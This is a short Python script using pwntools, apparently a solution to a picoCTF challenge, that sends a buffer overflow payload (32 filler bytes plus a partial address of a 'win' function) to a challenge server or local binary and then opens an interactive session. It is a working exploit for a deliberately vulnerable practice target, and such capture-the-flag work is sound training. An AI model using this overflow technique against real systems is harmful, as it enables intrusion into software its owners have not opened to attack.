#!/usr/bin/env python3
from pwn import *
from struct import pack

context.binary = binary = ELF("./vuln")

addr = 'mimas.picoctf.net'
port = '57382'

def conn():
    if args.LOCAL:
        r = process([binary.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(addr, port)
    return r

def attack(r, **kwargs):
    win = '4011a0'
    payload = b''
    payload += b'A'*0x20
    payload += b'\xa0\x11\x40'

    r.recvuntil("choice: ")
    r.sendline("2")
    r.recvuntil("buffer: ")
    r.sendline(payload)
    r.recvuntil("choice: ")
    r.sendline("4")


def main():
    r = conn()
    attack(r)
    r.interactive()


if __name__ == "__main__":
    main()
